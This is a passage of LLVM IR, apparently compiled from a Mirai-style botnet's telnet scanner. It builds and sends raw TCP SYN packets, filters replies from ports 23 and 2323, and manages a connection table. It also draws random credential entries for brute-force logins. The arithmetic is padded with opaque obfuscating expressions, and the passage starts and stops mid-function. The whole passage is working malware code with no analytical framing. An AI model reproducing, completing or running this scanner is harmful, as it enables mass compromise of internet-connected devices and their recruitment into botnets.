  %301 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 6
  store i16 0, i16* %302, align 4
  %303 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %305 = bitcast %struct.tcphdr* %304 to i8*
  %306 = call zeroext i16 @htons(i16 zeroext 20) #7
  %307 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %303, i8* %305, i16 zeroext %306, i32 20)
  %308 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 6
  store i16 %307, i16* %309, align 4
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  %313 = load i32, i32* %312, align 4
  %314 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %315 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %314, i32 0, i32 0
  store i32 %313, i32* %315, align 4
  %316 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 1
  %318 = load i16, i16* %317, align 2
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %318, i16* %319, align 2
  %320 = load i32, i32* @rsck, align 4
  %321 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %322 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %322, %struct.sockaddr** %321, align 8
  %323 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %324 = load %struct.sockaddr*, %struct.sockaddr** %323, align 8
  %325 = call i64 @sendto(i32 %320, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %324, i32 16)
  br label %326

; <label>:326:                                    ; preds = %295
  %327 = load i32, i32* %1, align 4
  %328 = sub i32 0, 1
  %329 = sub i32 %327, %328
  %330 = add nsw i32 %327, 1
  store i32 %329, i32* %1, align 4
  br label %259

; <label>:331:                                    ; preds = %259
  br label %332

; <label>:332:                                    ; preds = %331, %253
  store i32 0, i32* %9, align 4
  br label %333

; <label>:333:                                    ; preds = %500, %469, %454, %439, %428, %413, %402, %393, %376, %369, %362, %332
  %334 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %335 = bitcast i8* %334 to %struct.iphdr*
  store %struct.iphdr* %335, %struct.iphdr** %20, align 8
  %336 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i64 1
  %338 = bitcast %struct.iphdr* %337 to %struct.tcphdr*
  store %struct.tcphdr* %338, %struct.tcphdr** %21, align 8
  %339 = call i32* @__errno_location() #7
  store i32 0, i32* %339, align 4
  %340 = load i32, i32* @rsck, align 4
  %341 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %342 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %342, align 8
  %343 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %344 = load %struct.sockaddr*, %struct.sockaddr** %343, align 8
  %345 = call i64 @recvfrom(i32 %340, i8* %341, i64 1514, i32 16384, %struct.sockaddr* %344, i32* null)
  %346 = trunc i64 %345 to i32
  store i32 %346, i32* %18, align 4
  %347 = load i32, i32* %18, align 4
  %348 = icmp sle i32 %347, 0
  br i1 %348, label %357, label %349

; <label>:349:                                    ; preds = %333
  %350 = call i32* @__errno_location() #7
  %351 = load i32, i32* %350, align 4
  %352 = icmp eq i32 %351, 11
  br i1 %352, label %357, label %353

; <label>:353:                                    ; preds = %349
  %354 = call i32* @__errno_location() #7
  %355 = load i32, i32* %354, align 4
  %356 = icmp eq i32 %355, 11
  br i1 %356, label %357, label %358

; <label>:357:                                    ; preds = %353, %349, %333
  br label %512

; <label>:358:                                    ; preds = %353
  %359 = load i32, i32* %18, align 4
  %360 = sext i32 %359 to i64
  %361 = icmp ult i64 %360, 40
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %358
  br label %333

; <label>:363:                                    ; preds = %358
  %364 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load i32, i32* @LOCAL_ADDR, align 4
  %368 = icmp ne i32 %366, %367
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %363
  br label %333

; <label>:370:                                    ; preds = %363
  %371 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 6
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp ne i32 %374, 6
  br i1 %375, label %376, label %377

; <label>:376:                                    ; preds = %370
  br label %333

; <label>:377:                                    ; preds = %370
  %378 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = load i16, i16* %379, align 4
  %381 = zext i16 %380 to i32
  %382 = call zeroext i16 @htons(i16 zeroext 23) #7
  %383 = zext i16 %382 to i32
  %384 = icmp ne i32 %381, %383
  br i1 %384, label %385, label %394

; <label>:385:                                    ; preds = %377
  %386 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = load i16, i16* %387, align 4
  %389 = zext i16 %388 to i32
  %390 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %391 = zext i16 %390 to i32
  %392 = icmp ne i32 %389, %391
  br i1 %392, label %393, label %394

; <label>:393:                                    ; preds = %385
  br label %333

; <label>:394:                                    ; preds = %385, %377
  %395 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 1
  %397 = load i16, i16* %396, align 2
  %398 = zext i16 %397 to i32
  %399 = load i16, i16* %2, align 2
  %400 = zext i16 %399 to i32
  %401 = icmp ne i32 %398, %400
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %394
  br label %333

; <label>:403:                                    ; preds = %394
  %404 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 4
  %406 = load i16, i16* %405, align 4
  %407 = lshr i16 %406, 9
  %408 = xor i16 1, -1
  %409 = xor i16 %407, %408
  %410 = and i16 %409, %407
  %411 = and i16 %407, 1
  %412 = icmp ne i16 %410, 0
  br i1 %412, label %414, label %413

; <label>:413:                                    ; preds = %403
  br label %333

; <label>:414:                                    ; preds = %403
  %415 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = lshr i16 %417, 12
  %419 = xor i16 %418, -1
  %420 = xor i16 1, -1
  %421 = xor i16 24571, -1
  %422 = or i16 %419, %420
  %423 = or i16 24571, %421
  %424 = xor i16 %422, -1
  %425 = and i16 %424, %423
  %426 = and i16 %418, 1
  %427 = icmp ne i16 %425, 0
  br i1 %427, label %429, label %428

; <label>:428:                                    ; preds = %414
  br label %333

; <label>:429:                                    ; preds = %414
  %430 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 4
  %432 = load i16, i16* %431, align 4
  %433 = lshr i16 %432, 10
  %434 = xor i16 1, -1
  %435 = xor i16 %433, %434
  %436 = and i16 %435, %433
  %437 = and i16 %433, 1
  %438 = icmp ne i16 %436, 0
  br i1 %438, label %439, label %440

; <label>:439:                                    ; preds = %429
  br label %333

; <label>:440:                                    ; preds = %429
  %441 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = lshr i16 %443, 8
  %445 = xor i16 %444, -1
  %446 = xor i16 1, -1
  %447 = xor i16 16178, -1
  %448 = or i16 %445, %446
  %449 = or i16 16178, %447
  %450 = xor i16 %448, -1
  %451 = and i16 %450, %449
  %452 = and i16 %444, 1
  %453 = icmp ne i16 %451, 0
  br i1 %453, label %454, label %455

; <label>:454:                                    ; preds = %440
  br label %333

; <label>:455:                                    ; preds = %440
  %456 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 3
  %458 = load i32, i32* %457, align 4
  %459 = call i32 @ntohl(i32 %458) #7
  %460 = sub i32 %459, -512113273
  %461 = sub i32 %460, 1
  %462 = add i32 %461, -512113273
  %463 = sub i32 %459, 1
  %464 = call i32 @htonl(i32 %462) #7
  %465 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 8
  %467 = load i32, i32* %466, align 4
  %468 = icmp ne i32 %464, %467
  br i1 %468, label %469, label %470

; <label>:469:                                    ; preds = %455
  br label %333

; <label>:470:                                    ; preds = %455
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %471 = load i32, i32* %9, align 4
  store i32 %471, i32* %18, align 4
  br label %472

; <label>:472:                                    ; preds = %490, %470
  %473 = load i32, i32* %18, align 4
  %474 = icmp slt i32 %473, 256
  br i1 %474, label %475, label %496

; <label>:475:                                    ; preds = %472
  %476 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %477 = load i32, i32* %18, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %476, i64 %478
  %480 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %479, i32 0, i32 3
  %481 = load i32, i32* %480, align 8
  %482 = icmp eq i32 %481, 0
  br i1 %482, label %483, label %489

; <label>:483:                                    ; preds = %475
  %484 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %485 = load i32, i32* %18, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %484, i64 %486
  store %struct.scanner_connection* %487, %struct.scanner_connection** %22, align 8
  %488 = load i32, i32* %18, align 4
  store i32 %488, i32* %9, align 4
  br label %496

; <label>:489:                                    ; preds = %475
  br label %490

; <label>:490:                                    ; preds = %489
  %491 = load i32, i32* %18, align 4
  %492 = sub i32 %491, 1022347834
  %493 = add i32 %492, 1
  %494 = add i32 %493, 1022347834
  %495 = add nsw i32 %491, 1
  store i32 %494, i32* %18, align 4
  br label %472

; <label>:496:                                    ; preds = %483, %472
  %497 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %498 = icmp eq %struct.scanner_connection* %497, null
  br i1 %498, label %499, label %500

; <label>:499:                                    ; preds = %496
  br label %512

; <label>:500:                                    ; preds = %496
  %501 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %502 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %501, i32 0, i32 8
  %503 = load i32, i32* %502, align 4
  %504 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %505 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %504, i32 0, i32 4
  store i32 %503, i32* %505, align 4
  %506 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = load i16, i16* %507, align 4
  %509 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %510 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %509, i32 0, i32 5
  store i16 %508, i16* %510, align 8
  %511 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %511)
  br label %333

; <label>:512:                                    ; preds = %499, %357
  br label %513

; <label>:513:                                    ; preds = %512
  %514 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %515 = getelementptr inbounds [16 x i64], [16 x i64]* %514, i64 0, i64 0
  %516 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %515) #6, !srcloc !1
  %517 = extractvalue { i64, i64* } %516, 0
  %518 = extractvalue { i64, i64* } %516, 1
  %519 = trunc i64 %517 to i32
  store i32 %519, i32* %24, align 4
  %520 = ptrtoint i64* %518 to i64
  %521 = trunc i64 %520 to i32
  store i32 %521, i32* %25, align 4
  br label %522

; <label>:522:                                    ; preds = %513
  br label %523

; <label>:523:                                    ; preds = %522
  %524 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %525 = getelementptr inbounds [16 x i64], [16 x i64]* %524, i64 0, i64 0
  %526 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %525) #6, !srcloc !2
  %527 = extractvalue { i64, i64* } %526, 0
  %528 = extractvalue { i64, i64* } %526, 1
  %529 = trunc i64 %527 to i32
  store i32 %529, i32* %26, align 4
  %530 = ptrtoint i64* %528 to i64
  %531 = trunc i64 %530 to i32
  store i32 %531, i32* %27, align 4
  br label %532

; <label>:532:                                    ; preds = %523
  store i32 0, i32* %1, align 4
  br label %533

; <label>:533:                                    ; preds = %690, %532
  %534 = load i32, i32* %1, align 4
  %535 = icmp slt i32 %534, 256
  br i1 %535, label %536, label %697

; <label>:536:                                    ; preds = %533
  %537 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %538 = load i32, i32* %1, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %537, i64 %539
  store %struct.scanner_connection* %540, %struct.scanner_connection** %7, align 8
  %541 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %542 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %541, i32 0, i32 3
  %543 = load i32, i32* %542, align 8
  %544 = icmp ugt i32 %543, 1
  %545 = select i1 %544, i32 30, i32 5
  store i32 %545, i32* %28, align 4
  %546 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %547 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %546, i32 0, i32 3
  %548 = load i32, i32* %547, align 8
  %549 = icmp ne i32 %548, 0
  br i1 %549, label %550, label %596

; <label>:550:                                    ; preds = %536
  %551 = load i32, i32* @fake_time, align 4
  %552 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %553 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %552, i32 0, i32 2
  %554 = load i32, i32* %553, align 4
  %555 = sub i32 %551, -2045349400
  %556 = sub i32 %555, %554
  %557 = add i32 %556, -2045349400
  %558 = sub i32 %551, %554
  %559 = load i32, i32* %28, align 4
  %560 = icmp ugt i32 %557, %559
  br i1 %560, label %561, label %596

; <label>:561:                                    ; preds = %550
  %562 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %563 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %562, i32 0, i32 1
  %564 = load i32, i32* %563, align 8
  %565 = call i32 @close(i32 %564)
  %566 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %566, i32 0, i32 1
  store i32 -1, i32* %567, align 8
  %568 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %569 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %568, i32 0, i32 3
  %570 = load i32, i32* %569, align 8
  %571 = icmp ugt i32 %570, 2
  br i1 %571, label %572, label %590

; <label>:572:                                    ; preds = %561
  %573 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %574 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %573, i32 0, i32 8
  %575 = load i8, i8* %574, align 8
  %576 = sub i8 %575, 5
  %577 = add i8 %576, 1
  %578 = add i8 %577, 5
  %579 = add i8 %575, 1
  store i8 %578, i8* %574, align 8
  %580 = zext i8 %578 to i32
  %581 = icmp eq i32 %580, 10
  br i1 %581, label %582, label %587

; <label>:582:                                    ; preds = %572
  %583 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %583, i32 0, i32 8
  store i8 0, i8* %584, align 8
  %585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %586 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %585, i32 0, i32 3
  store i32 0, i32* %586, align 8
  br label %589

; <label>:587:                                    ; preds = %572
  %588 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %588)
  br label %589

; <label>:589:                                    ; preds = %587, %582
  br label %595

; <label>:590:                                    ; preds = %561
  %591 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %592 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %591, i32 0, i32 8
  store i8 0, i8* %592, align 8
  %593 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %593, i32 0, i32 3
  store i32 0, i32* %594, align 8
  br label %595

; <label>:595:                                    ; preds = %590, %589
  br label %690

; <label>:596:                                    ; preds = %550, %536
  %597 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %598 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %597, i32 0, i32 3
  %599 = load i32, i32* %598, align 8
  %600 = icmp eq i32 %599, 1
  br i1 %600, label %601, label %642

; <label>:601:                                    ; preds = %596
  %602 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %603 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %602, i32 0, i32 1
  %604 = load i32, i32* %603, align 8
  %605 = srem i32 %604, 64
  %606 = zext i32 %605 to i64
  %607 = shl i64 1, %606
  %608 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %609 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %610 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %609, i32 0, i32 1
  %611 = load i32, i32* %610, align 8
  %612 = sdiv i32 %611, 64
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds [16 x i64], [16 x i64]* %608, i64 0, i64 %613
  %615 = load i64, i64* %614, align 8
  %616 = xor i64 %615, -1
  %617 = xor i64 %607, -1
  %618 = xor i64 4060190091753984900, -1
  %619 = and i64 %616, 4060190091753984900
  %620 = and i64 %615, %618
  %621 = and i64 %617, 4060190091753984900
  %622 = and i64 %607, %618
  %623 = or i64 %619, %620
  %624 = or i64 %621, %622
  %625 = xor i64 %623, %624
  %626 = or i64 %616, %617
  %627 = xor i64 %626, -1
  %628 = or i64 4060190091753984900, %618
  %629 = and i64 %627, %628
  %630 = or i64 %625, %629
  %631 = or i64 %615, %607
  store i64 %630, i64* %614, align 8
  %632 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %633 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %632, i32 0, i32 1
  %634 = load i32, i32* %633, align 8
  %635 = load i32, i32* %12, align 4
  %636 = icmp sgt i32 %634, %635
  br i1 %636, label %637, label %641

; <label>:637:                                    ; preds = %601
  %638 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %639 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %638, i32 0, i32 1
  %640 = load i32, i32* %639, align 8
  store i32 %640, i32* %12, align 4
  br label %641

; <label>:641:                                    ; preds = %637, %601
  br label %689

; <label>:642:                                    ; preds = %596
  %643 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %644 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %643, i32 0, i32 3
  %645 = load i32, i32* %644, align 8
  %646 = icmp ne i32 %645, 0
  br i1 %646, label %647, label %688

; <label>:647:                                    ; preds = %642
  %648 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %648, i32 0, i32 1
  %650 = load i32, i32* %649, align 8
  %651 = srem i32 %650, 64
  %652 = zext i32 %651 to i64
  %653 = shl i64 1, %652
  %654 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %655 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %656 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %655, i32 0, i32 1
  %657 = load i32, i32* %656, align 8
  %658 = sdiv i32 %657, 64
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds [16 x i64], [16 x i64]* %654, i64 0, i64 %659
  %661 = load i64, i64* %660, align 8
  %662 = xor i64 %661, -1
  %663 = xor i64 %653, -1
  %664 = xor i64 -7357254010781837366, -1
  %665 = and i64 %662, -7357254010781837366
  %666 = and i64 %661, %664
  %667 = and i64 %663, -7357254010781837366
  %668 = and i64 %653, %664
  %669 = or i64 %665, %666
  %670 = or i64 %667, %668
  %671 = xor i64 %669, %670
  %672 = or i64 %662, %663
  %673 = xor i64 %672, -1
  %674 = or i64 -7357254010781837366, %664
  %675 = and i64 %673, %674
  %676 = or i64 %671, %675
  %677 = or i64 %661, %653
  store i64 %676, i64* %660, align 8
  %678 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %679 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %678, i32 0, i32 1
  %680 = load i32, i32* %679, align 8
  %681 = load i32, i32* %11, align 4
  %682 = icmp sgt i32 %680, %681
  br i1 %682, label %683, label %687

; <label>:683:                                    ; preds = %647
  %684 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %685 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %684, i32 0, i32 1
  %686 = load i32, i32* %685, align 8
  store i32 %686, i32* %11, align 4
  br label %687

; <label>:687:                                    ; preds = %683, %647
  br label %688

; <label>:688:                                    ; preds = %687, %642
  br label %689

; <label>:689:                                    ; preds = %688, %641
  br label %690

; <label>:690:                                    ; preds = %689, %595
  %691 = load i32, i32* %1, align 4
  %692 = sub i32 0, %691
  %693 = sub i32 0, 1
  %694 = add i32 %692, %693
  %695 = sub i32 0, %694
  %696 = add nsw i32 %691, 1
  store i32 %695, i32* %1, align 4
  br label %533

; <label>:697:                                    ; preds = %533
  %698 = getelementptr inbounds %struct.timeval.31, %struct.timeval.31* %8, i32 0, i32 1
  store i64 0, i64* %698, align 8
  %699 = getelementptr inbounds %struct.timeval.31, %struct.timeval.31* %8, i32 0, i32 0
  store i64 1, i64* %699, align 8
  %700 = load i32, i32* %12, align 4
  %701 = load i32, i32* %11, align 4
  %702 = icmp sgt i32 %700, %701
  br i1 %702, label %703, label %705

; <label>:703:                                    ; preds = %697
  %704 = load i32, i32* %12, align 4
  br label %707

; <label>:705:                                    ; preds = %697
  %706 = load i32, i32* %11, align 4
  br label %707

; <label>:707:                                    ; preds = %705, %703
  %708 = phi i32 [ %704, %703 ], [ %706, %705 ]
  %709 = add i32 1, -1821154337
  %710 = add i32 %709, %708
  %711 = sub i32 %710, -1821154337
  %712 = add nsw i32 1, %708
  %713 = call i32 @select(i32 %711, %struct.fd_set.30* %5, %struct.fd_set.30* %6, %struct.fd_set.30* null, %struct.timeval.31* %8)
  store i32 %713, i32* %13, align 4
  %714 = call i64 @time(i64* null) #6
  %715 = trunc i64 %714 to i32
  store i32 %715, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %716

; <label>:716:                                    ; preds = %1166, %707
  %717 = load i32, i32* %1, align 4
  %718 = icmp slt i32 %717, 256
  br i1 %718, label %719, label %1171

; <label>:719:                                    ; preds = %716
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %721 = load i32, i32* %1, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %720, i64 %722
  store %struct.scanner_connection* %723, %struct.scanner_connection** %7, align 8
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 1
  %726 = load i32, i32* %725, align 8
  %727 = icmp eq i32 %726, -1
  br i1 %727, label %728, label %729

; <label>:728:                                    ; preds = %719
  br label %1166

; <label>:729:                                    ; preds = %719
  %730 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %731 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %732 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %731, i32 0, i32 1
  %733 = load i32, i32* %732, align 8
  %734 = sdiv i32 %733, 64
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds [16 x i64], [16 x i64]* %730, i64 0, i64 %735
  %737 = load i64, i64* %736, align 8
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %739 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %738, i32 0, i32 1
  %740 = load i32, i32* %739, align 8
  %741 = srem i32 %740, 64
  %742 = zext i32 %741 to i64
  %743 = shl i64 1, %742
  %744 = xor i64 %737, -1
  %745 = xor i64 %743, -1
  %746 = xor i64 -1053551995481057026, -1
  %747 = or i64 %744, %745
  %748 = or i64 -1053551995481057026, %746
  %749 = xor i64 %747, -1
  %750 = and i64 %749, %748
  %751 = and i64 %737, %743
  %752 = icmp ne i64 %750, 0
  br i1 %752, label %753, label %784

; <label>:753:                                    ; preds = %729
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %754 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %755 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %754, i32 0, i32 1
  %756 = load i32, i32* %755, align 8
  %757 = bitcast i32* %29 to i8*
  %758 = call i32 @getsockopt(i32 %756, i32 1, i32 4, i8* %757, i32* %31) #6
  store i32 %758, i32* %30, align 4
  %759 = load i32, i32* %29, align 4
  %760 = icmp eq i32 %759, 0
  br i1 %760, label %761, label %772

; <label>:761:                                    ; preds = %753
  %762 = load i32, i32* %30, align 4
  %763 = icmp eq i32 %762, 0
  br i1 %763, label %764, label %772

; <label>:764:                                    ; preds = %761
  %765 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %766 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %765, i32 0, i32 3
  store i32 2, i32* %766, align 8
  %767 = call %struct.scanner_auth* @random_auth_entry()
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 0
  store %struct.scanner_auth* %767, %struct.scanner_auth** %769, align 8
  %770 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %771 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %770, i32 0, i32 6
  store i32 0, i32* %771, align 4
  br label %783

; <label>:772:                                    ; preds = %761, %753
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 1
  %775 = load i32, i32* %774, align 8
  %776 = call i32 @close(i32 %775)
  %777 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %778 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %777, i32 0, i32 1
  store i32 -1, i32* %778, align 8
  %779 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %780 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %779, i32 0, i32 8
  store i8 0, i8* %780, align 8
  %781 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %782 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %781, i32 0, i32 3
  store i32 0, i32* %782, align 8
  br label %1166

; <label>:783:                                    ; preds = %764
  br label %784

; <label>:784:                                    ; preds = %783, %729
  %785 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %787 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %786, i32 0, i32 1
  %788 = load i32, i32* %787, align 8
  %789 = sdiv i32 %788, 64
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds [16 x i64], [16 x i64]* %785, i64 0, i64 %790
  %792 = load i64, i64* %791, align 8
  %793 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
